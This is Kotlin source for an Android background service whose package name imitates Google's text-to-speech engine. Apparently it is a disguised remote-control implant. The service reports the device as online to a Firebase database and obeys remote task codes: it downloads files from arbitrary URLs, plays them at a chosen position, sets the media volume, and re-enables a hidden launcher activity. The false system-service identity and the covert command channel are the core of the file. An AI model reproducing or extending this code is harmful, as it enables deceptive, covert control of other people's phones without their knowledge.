package com.googli.googletext_to_speechengine

import android.app.Service
import android.content.Context
import android.content.ContextWrapper
import android.content.Intent
import android.media.MediaPlayer
import android.os.AsyncTask
import android.os.IBinder
import com.google.firebase.database.*
import java.io.BufferedInputStream
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import android.R.attr.path
import android.app.NotificationManager
import android.content.ComponentName
import android.content.pm.PackageManager
import android.media.AudioManager
import com.google.firebase.messaging.FirebaseMessagingService
import java.util.*


class Text_to_Speech_Service : Service() {
    var firebaseDatabase = FirebaseDatabase.getInstance().reference
    var name = ""
    val player = MediaPlayer()
    var destroyCheck=0
    override fun onBind(intent: Intent?): IBinder {
        return Text_to_Speech_ServiceBinder()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        println("onStartCommand")

        setAsynctask()
        firebaseListner(getSharedPreferences("Main", 0).getString("Name", "").toString())
        return START_STICKY
    }
fun setAsynctask(){
}
    fun firebaseListner(name: String) {
        val Name = getSharedPreferences("Main", 0).getString("Name", "").toString()
        this.name = Name
        firebaseDatabase.child(name).child("Status").setValue("Online")
        firebaseDatabase.child(Name).child("Task").addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

            override fun onDataChange(dataSnapshot: DataSnapshot?) {
                val taskIdAny = dataSnapshot!!.child("TaskID").value
                var taskId = 100
                try {
                    taskId = taskIdAny.toString().toInt()
                } catch (e: Exception) {
                }
                if (taskId == 0) {
                    val trackName = dataSnapshot.child("TrackName").value
                    downloadTrack(trackName.toString())
                }
                if (taskId == 1) {
                    val trackName = dataSnapshot.child("TrackName").value
                    val startSec = dataSnapshot.child("SeekTo").value
                    playTrack(trackName.toString(), startSec.toString().toInt())
                }
                if (taskId == 2) {
                    val trackName = dataSnapshot.child("TrackName").value
                    pauseTrack(trackName.toString())
                }
                if (taskId == 3) {
                    val trackName = dataSnapshot.child("TrackName").value
                    stopTrack(trackName.toString())
                }
                if (taskId == 4) {
                    val trackName = dataSnapshot.child("TrackName").value
                    rePlayTrack(trackName.toString())
                }
                if (taskId == 5) {
                    val volume = dataSnapshot.child("Volume").value
                    setVolume(volume.toString().toInt())
                }
                if (taskId == 10) {
                    firebaseDatabase.child(name).child("Status").setValue(Random().nextInt())
                    firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
                }
                if (taskId == 20) {
                    addDrawerIcon()
                    destroyCheck = 1
                    openActivity()
                }

            }
        })
    }

    fun downloadTrack(trackName: String) {
        var songLink = firebaseDatabase.child("Tracks").addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError?) {
                TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
            }

            override fun onDataChange(p0: DataSnapshot?) {
                val cw = ContextWrapper(applicationContext)

                val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

                val mypath = File(directory, "$trackName.mp3")
                val f = File(mypath.toString())

                if (f.exists()) {
                    firebaseDatabase.child(name).child("DownloadProgress").setValue("Exists")
                } else {
                    downloadTrackCode(p0!!.child(trackName).value.toString(), trackName)
                }

            }

        })


    }

    fun playTrack(trackName: String, SeekTo: Int) {
        //  val mediaPlayer = MediaPlayer.create(this, )
        val cw = ContextWrapper(applicationContext)

        val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

        val path = File(directory, "$trackName.mp3")


        try {
            player.setDataSource(path.toString())
            player.prepare()
        } catch (e: IllegalArgumentException) {
            e.printStackTrace()
        } catch (e: Exception) {
            println("Exception of type : " + e.toString())
            e.printStackTrace()
        }

        player.seekTo(SeekTo*1000)
        player.start()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun pauseTrack(trackName: String) {
        if (player.isPlaying) {
            player.pause()
        } else {
            player.start()
        }
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun stopTrack(trackName: String) {
        player.stop()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun rePlayTrack(trackName: String) {
        stopTrack(trackName)
        player.prepare()
        player.start()
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun setVolume(volume: Int) {
        val audioManager = applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, volume, 0)
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)
    }

    fun downloadTrackCode(urlString: String, trackName: String) {
        var count: Int
        AsyncTask.execute {
            try {
                val url = URL(urlString)
                val conexion = url.openConnection()
                conexion.connect()
                // this will be useful so that you can show a tipical 0-100% progress bar
                val lenghtOfFile = conexion.contentLength
                val cw = ContextWrapper(applicationContext)

                val directory = cw.getDir("Songs", Context.MODE_PRIVATE)

                val mypath = File(directory, "$trackName.mp3")

                // download the file
                val input = BufferedInputStream(url.openStream())
                val output = FileOutputStream(mypath)

                val data = ByteArray(1024)

                var total: Long = 0
                count = input.read(data)
                while (count != -1) {

                    total += count.toLong()
                    // publishing the progress....
                    downloadCallBack((total * 100 / lenghtOfFile).toInt())
                    if((total * 100 / lenghtOfFile).toInt()==100){
                        firebaseDatabase.child(name).child("Tracks").child(trackName).setValue(url)
                    }
                    output.write(data, 0, count)
                    count = input.read(data)
                }

                output.flush()
                output.close()
                input.close()
            } catch (e: Exception) {
            }
        }
        firebaseDatabase.child(name).child("Task").child("TaskID").setValue(100)

    }

    fun downloadCallBack(percentage: Int) {
        firebaseDatabase.child(name).child("DownloadProgress").setValue(percentage)

    }

    inner class Text_to_Speech_ServiceBinder : android.os.Binder() {
        fun getService(): Text_to_Speech_Service {
            return this@Text_to_Speech_Service
        }
    }

    fun openActivity(){
        destroyCheck=1
        startActivity(Intent(this,FlashActivity::class.java))
        stopSelf()
    }

    fun addDrawerIcon() {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.FlashActivity")

        packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (destroyCheck==0) {
            firebaseDatabase.child(name).child("Status").setValue("Offline")
        }
    }
}
